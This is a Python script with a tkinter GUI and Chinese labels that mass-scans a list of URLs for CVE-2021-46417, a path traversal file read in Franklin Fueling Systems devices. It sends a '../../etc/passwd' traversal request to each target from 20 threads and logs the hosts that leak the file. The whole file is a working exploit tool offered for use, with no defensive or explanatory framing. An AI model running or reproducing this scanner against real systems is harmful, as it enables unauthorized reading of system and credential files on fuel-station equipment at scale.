import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_exp(url):
    poc = r"""/cgi-bin/tsaupload.cgi?file_name=../../../../../../etc/passwd&password="""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "root" in res.text:
            Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.see(END)
            with open ("存在Franklin Fueling Systems任意文件读取漏洞(CVE-2021-46417)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.see(END)
    except Exception as err:
        Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.see(END)
def get_Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_gui():
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417 = tk.Tk()
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417.geometry("910x450")
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417.title("Franklin Fueling Systems任意文件读取漏洞(CVE-2021-46417)一把梭")
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417.resizable(0, 0)
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417.iconbitmap('logo.ico')
    global Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text = scrolledtext.ScrolledText(Franklin_Fueling_Systems_anyfile_read_cve_2021_46417,width=123, height=25)
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.grid(row=0, column=0, padx=10, pady=10)
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_text.see(END)
    addrs = get_Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Franklin_Fueling_Systems_anyfile_read_cve_2021_46417_exp, addr)
    Franklin_Fueling_Systems_anyfile_read_cve_2021_46417.mainloop()